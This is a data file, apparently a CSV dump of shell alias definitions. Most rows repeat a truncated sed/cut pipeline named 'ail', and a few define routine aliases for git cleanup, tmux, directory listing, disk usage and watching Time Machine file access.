3733240,587191,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3733204,587190,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3733168,587189,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3733132,587188,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3733096,587187,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3733060,587186,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3733024,587185,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3732988,587184,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3732952,587183,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3732916,587182,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3732880,587181,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3732844,587180,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3732790,587178,gc,git pull; git remote prune origin; git branch --merged | grep -v """"\*"""" | xargs -n 1 git branch -d; git gc"""
3732750,587177,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3732714,587176,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3732677,587174,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3732641,587173,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3732605,587172,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3732569,587171,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3732533,587170,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3732497,587169,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3732461,587168,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3732425,587167,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3732389,587166,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3732353,587165,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3732317,587164,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3732281,587163,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3732085,587160,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3732049,587159,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3731293,587125,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3695254,586595,tmsnoop,sudo fs_usage -w -f pathname | grep backupd | grep '(R___'"""
3693225,586339,ta,tmux attach || tmux"""
3671317,584846,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3671281,584844,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3671096,584833,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3671060,584832,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3671024,584831,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3670852,584824,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3670723,584819,lr,ls -R | grep """":$"""" | sed -e """
3670680,584818,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3670644,584817,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3670581,584815,ducks,du -cks err.txt generated.file succ.txt | sort -rn | head"""
3670554,584814,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3670518,584813,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3670392,584809,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3670356,584808,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3670320,584807,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3670283,584804,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3670247,584803,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3670211,584802,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3670120,584799,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3670084,584798,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3670025,584796,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3669966,584794,lr,ls -R | grep """":$"""" | sed -e """
3669919,584793,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3669883,584792,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3669847,584791,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3669811,584790,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3669729,584782,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3669693,584781,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3669657,584780,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3669621,584779,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3669585,584778,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3669549,584777,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3669513,584776,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3669477,584775,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3669441,584773,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3669405,584772,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3669369,584771,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3669283,584768,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3669247,584767,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3669211,584766,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3669175,584765,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3669137,584762,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3669101,584761,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3669059,584758,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3669023,584757,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3668967,584754,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3668931,584753,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3668895,584752,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3668858,584750,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3668822,584749,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3668786,584748,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3668750,584746,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3668714,584745,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3668616,584741,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3668580,584740,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3668544,584739,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3668508,584738,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3668472,584737,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3668436,584736,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3668282,584732,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3668246,584731,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3668210,584730,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3668174,584729,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3668138,584728,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3667989,584724,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3667953,584723,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3667917,584722,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3667880,584720,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3667844,584719,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3667808,584718,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3667772,584717,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3667736,584716,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3667697,584712,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3667661,584711,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3667625,584709,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3667579,584707,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3667543,584706,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3667507,584705,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3667471,584704,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3667435,584703,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3667399,584702,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3667363,584701,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3667327,584700,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3667291,584699,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3667255,584698,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3667219,584697,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3667183,584696,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3667147,584695,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3667111,584694,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3667075,584693,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3667039,584692,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3667003,584691,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3666967,584690,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3666931,584689,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3666895,584688,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3666859,584687,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3666823,584686,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3666787,584685,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3666751,584684,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3666715,584683,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3666679,584682,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3666643,584681,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3666607,584680,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3666571,584679,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3666535,584678,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3666499,584677,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3666462,584675,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3666426,584674,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3666390,584673,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3666354,584672,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3666318,584671,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3666282,584670,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3666246,584669,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3666210,584668,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3666174,584667,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3666138,584666,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3666102,584665,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3666066,584664,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3666029,584662,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3665993,584661,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3665957,584660,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3665921,584659,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3665885,584658,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3665849,584657,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3665812,584655,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3665776,584654,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3665732,584652,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3665696,584651,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3665660,584650,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3665624,584649,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3665588,584648,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3665552,584647,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3665516,584646,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3665480,584645,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3665444,584644,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3665408,584643,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3665372,584642,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3665336,584641,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3665300,584640,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3665236,584638,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3665200,584637,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3665164,584636,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3665128,584635,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3665092,584634,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3665056,584633,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3665020,584632,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3664984,584631,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3664948,584630,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3664912,584629,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3664876,584628,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3664840,584627,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3664804,584626,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3664768,584625,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3664732,584624,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3664696,584623,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3664660,584622,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3664624,584621,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3664588,584620,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3664552,584619,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3664516,584618,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3664480,584617,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3664444,584616,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3664408,584615,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3664372,584614,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3664336,584613,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3664300,584612,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3664264,584611,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3664228,584610,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3664192,584609,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3664156,584608,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3664120,584607,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3664084,584606,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3664048,584605,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3664012,584604,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3663976,584603,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3663940,584602,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3663904,584601,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3663868,584600,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3663832,584599,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3663796,584598,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3663760,584597,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3663724,584596,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3663688,584595,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3663652,584594,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3663616,584593,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3663580,584592,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3663544,584591,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3663508,584590,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3663472,584589,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3663436,584588,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3663400,584587,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3663364,584586,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3663328,584585,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3663292,584584,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3663256,584583,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3663220,584582,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3663184,584581,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3663148,584580,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3663112,584579,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3663076,584578,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3663040,584577,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3663004,584576,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3662968,584575,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3662932,584574,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3662896,584573,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3662860,584572,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3662824,584571,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3662788,584570,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3662752,584569,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3662716,584568,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3662680,584567,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3662644,584566,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3662608,584565,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3662572,584564,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3662536,584563,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3662500,584562,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3662464,584561,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3662428,584560,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3662392,584559,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3662355,584557,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3662319,584556,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3662283,584555,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3662247,584554,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3662116,584551,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3662080,584550,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3662044,584549,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3662008,584548,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3661972,584547,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3661936,584546,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3661900,584545,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3661864,584544,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3661828,584543,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3661792,584541,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3661756,584540,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3661720,584539,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3661684,584538,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3661648,584537,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3661612,584536,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3661576,584535,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3661540,584534,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3661504,584533,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3661468,584532,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3661432,584531,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3661396,584530,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3661360,584529,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3661324,584528,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3661288,584527,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3661252,584526,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3661216,584525,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3661180,584524,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3660807,584519,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3660771,584518,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3660735,584517,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3660699,584516,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3660617,584514,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3660581,584513,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3660545,584512,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3660509,584511,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3660473,584510,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3660437,584509,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3660401,584508,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3660365,584507,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3660329,584506,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
